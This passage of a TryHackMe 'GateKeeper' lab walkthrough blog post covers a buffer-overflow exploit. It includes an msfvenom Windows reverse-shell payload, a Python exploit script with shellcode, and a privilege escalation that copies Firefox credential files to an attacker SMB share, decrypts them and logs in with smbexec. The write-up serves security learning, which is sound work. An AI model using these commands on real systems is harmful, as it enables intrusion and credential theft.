</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/jmp.png" alt="" /></p><p>We use the first address¬†: <code class="language-plaintext highlighter-rouge">\x08\x04\x14\xc3</code> as our return address. However we will reverse the order (\xc3\x14\x04\x08), since the stack goes from the top of the memory to the bottom, thus we need to write the ‚Äúdata from low to high‚Äù</p><p>This diagram gives a better understanding¬†:</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/endian.png" alt="" /></p><p>We also add some padding to fill the buffer. <code class="language-plaintext highlighter-rouge">(\x90)*32</code></p><h3 id="payload">Payload</h3><p>Generate a reverse shell using <code class="language-plaintext highlighter-rouge">msfvenom</code>¬†, omitting all the badchars as below:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-b</span> <span class="s1">'\x00\x0a'</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> python <span class="nt">-v</span> payload
</pre></table></code></div></div><p>Copy the output to the payload, the final exploit code should look like¬†:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">socket</span>
<span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10.10.17.49</span><span class="sh">"</span> <span class="o">///</span><span class="n">treplace</span> <span class="k">with</span> <span class="n">your</span> <span class="n">ip</span> <span class="k">from</span> <span class="n">THM</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">146</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">return_add</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xc3\x14\x04\x08</span><span class="sh">"</span>
<span class="n">padding</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">32</span>
<span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xbe\x37\x70\xb2\x1e\xd9\xc9\xd9\x74\x24\xf4\x5f</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x33\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\x40</span><span class="sh">"</span>
<span class="p">.</span><span class="bp">...</span>
<span class="o">&lt;</span><span class="n">truncated</span><span class="o">&gt;</span>
</pre></table></code></div></div><h3 id="profit">Profit</h3><p>start a <code class="language-plaintext highlighter-rouge">netcat</code> listener on the port you defined in the msfvenom shellcode generator, launch the exploit against the target system, to get shell access and collect the user flag.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/user.png" alt="" /></p><h2 id="privilege-escalation">Privilege Escalation</h2><p>To grab the root user flag, we have to do privilege escalation. Running <code class="language-plaintext highlighter-rouge">systeminfo</code>, we see this is a Windows 7 machine, which as you can probably guess, has a plethora of possible vulnerabilities.</p><p>We can grab the systeminfo output and run it against <a href="https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Fbitsadmin%2Fwesng">Windows Exploit Suggestor</a> to discver any kernel exploits.</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">python</span> <span class="n">wes</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">database_file</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span><span class="n">system_info_file</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>However, we realize we cannot really do much since we cannot run powershell or run any¬†.exe‚Äôs on the system.</p><p>I also checked the user <em>natbat</em>‚Äôs privileges and he doesn‚Äôt have any token impersonation privileges, meaning attacks such as token impersonation, won‚Äôt get anywhere.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/whoami.png" alt="" /></p><p>To avoid rabbit holes I decided to rethink. Then I noticed Firefox shortcut on the user‚Äôs Desktop.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/firefox_lnk.png" alt="" /></p><p>I did some Googling and realized if we had some files from Firefox, we can use <a href="https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Funode%2Ffirefox_decrypt">Firefox Decrypt</a> to get some credentials.</p><p>The files needed are¬†: <a href="https://medium.com/r/?url=https%3A%2F%2Fsupport.mozilla.org%2Fen-US%2Fkb%2Fprofiles-where-firefox-stores-user-data">Read more</a> login.json and key4.db where passwords are stored cert9.db which contains all security certificate settings</p><p>These files are stored under</p><blockquote><p>%APPDATA%\Mozilla\Firefox\Profiles\</p></blockquote><p>We move to that directory and prepare to copy the files. We can set up an <em>smbserver</em> on our Kali machine to achieve this.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbserver.py share <span class="nb">.</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/smbserver.png" alt="" /></p><p>This will expose the current directory as a share.</p><p>We can see the files on our victim machine under the path:</p><blockquote><p>C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release&gt;</p></blockquote><p>Copy the files to the Kali machine:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>copy cert9.db \\10.9.167.154\share
</pre></table></code></div></div><p>Do the same for all the required files.</p><p>Next we clone the <a href="https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Funode%2Ffirefox_decrypt">Firefox Decrypt</a> tool and run it against the folder where we have the files downloaded. When asked for a master password, press enter to continue.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python firefox_decrypt/firefox_decrypt.py .
</pre></table></code></div></div><p>We see this gives us some credentials.</p><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/credentials.png" alt="" /></p><h3 id="pwning">Pwning</h3><p>We can then use <code class="language-plaintext highlighter-rouge">smbexec</code> (You can also try with psexec or wmiexec) to log into the server with the credentials provided.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbexec.py <span class="s1">'&lt;user&gt;:&lt;password&gt;@10.10.15.227'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/images/gatekeeper/system.png" alt="" /></p><p>Grab the root flag under the Desktop of the <em>mayor</em> user¬†!</p><h2 id="lessons-learnt">Lessons Learnt</h2><ol><li><p>During privilege escalation, avoid potential rabbit holes by doing a quick shortlist of what is required for an exploit to work. If one misses, ignore that path and try another.</p><li><p>I now understand why it‚Äôs probably safer to save your passwords using a password manager instead of the browser.</p></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthroughs/'>Walkthroughs</a>, <a href='/categories/thm/'>THM</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >Buffer Overflow</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a> <a href="/tags/smbexec/" class="post-tag no-text-decoration" >smbexec</a> <a href="/tags/smbclient/" class="post-tag no-text-decoration" >smbclient</a> <a href="/tags/mona/" class="post-tag no-text-decoration" >mona</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM - GateKeeper Walkthrough - w33vil's blog&url=https://w33vils.github.io/posts/thm_gatekeeper_walkthrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=THM - GateKeeper Walkthrough - w33vil's blog&u=https://w33vils.github.io/posts/thm_gatekeeper_walkthrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=THM - GateKeeper Walkthrough - w33vil's blog&url=https://w33vils.github.io/posts/thm_gatekeeper_walkthrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/oscp_review/">My OSCP Experience</a><li><a href="/posts/blog_downtimeDetector/">Python DowntimeDetector</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/regex/">regex</a> <a class="post-tag" href="/tags/telegram/">telegram</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/cockpit/">cockpit</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/downtime/">downtime</a> <a class="post-tag" href="/tags/email/">email</a> <a class="post-tag" href="/tags/mona/">mona</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm_cmspit_walkthrough/"><div class="card-body"> <span class="timeago small" >Aug 6, 2021<i class="unloaded">2021-08-06T08:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM - CMS Pit walkthrough</h3><div class="text-muted small"><p> CMS PIT Walkthrough - w/o Metasploit I was interested in documenting this box, since I used it to write my own exploit, hence the writeup. You can access the box at https://tryhackme.com/room/c...</p></div></div></a></div><div class="card"> <a href="/posts/dns/"><div class="card-body"> <span class="timeago small" >Jan 1<i class="unloaded">2025-01-01T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Dns</h3><div class="text-muted small"><p> üåê Why DNS is Cool‚Ä¶ and Not So Cool 1 2 3 4 5 6 7 8 9 10 11 12 ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó ‚ïë üåê DNS üåê ‚ïë ‚ïë The Internet's Magic ‚ïë ...</p></div></div></a></div><div class="card"> <a href="/posts/osep-review/"><div class="card-body"> <span class="timeago small" >Dec 18, 2022<i class="unloaded">2022-12-18T08:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OSEP Review</h3><div class="text-muted small"><p> I recently passed the Evasion Techniques and Breaching Defenses course or as it is known - Offensive Security Experienced Pentester (OSEP) exam by Offensive Security and here are my no-one-asked th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/blog_downtimeDetector/" class="btn btn-outline-primary" prompt="Older"><p>Python DowntimeDetector</p></a> <a href="/posts/oscp_review/" class="btn btn-outline-primary" prompt="Newer"><p>My OSCP Experience</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2025 <a href="https://twitter.com/w33vils">Brian Ombongi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/regex/">regex</a> <a class="post-tag" href="/tags/telegram/">telegram</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/cockpit/">cockpit</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/downtime/">downtime</a> <a class="post-tag" href="/tags/email/">email</a> <a class="post-tag" href="/tags/mona/">mona</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://w33vils.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
